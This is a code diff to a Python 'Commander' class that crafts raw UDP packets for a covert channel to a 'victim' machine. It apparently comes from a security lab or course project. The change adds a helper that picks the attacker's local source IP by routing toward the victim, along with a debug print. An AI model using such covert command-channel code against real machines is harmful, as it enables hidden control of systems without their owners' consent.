@@ -12,6 +12,16 @@ COVERT_UDP_PORT = 40000  # The UDP port on a victim used for a covert channel
 # Timeouts
 RECV_TIMEOUT = 5.0  # seconds to wait for a response from a victim
 
+def get_local_ip(dest_ip, dest_port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # 用 Victim 的 UDP 端口（这里用 COVERT_UDP_PORT）来探路
+    s.connect((dest_ip, dest_port))
+    local_ip = s.getsockname()[0]
+    s.close()
+    return local_ip
+
+
+
 class Commander:
     def __init__(self):
         self.sock = None  # Raw socket for a covert channel
@@ -84,7 +94,10 @@ class Commander:
             flags_frag = 0  # no fragmentation
             ttl = 64
             proto = socket.IPPROTO_UDP
-            src_ip = socket.gethostbyname(socket.gethostname())  # attacker local IP
+            #src_ip = socket.gethostbyname(socket.gethostname())  # attacker local IP
+            src_ip = get_local_ip(VICTIM_IP, COVERT_UDP_PORT)
+
+            print(f"[DEBUG] Commander is using src_ip = {src_ip} for covert packets")
             dst_ip = VICTIM_IP
             src_addr = socket.inet_aton(src_ip)
             dst_addr = socket.inet_aton(dst_ip)
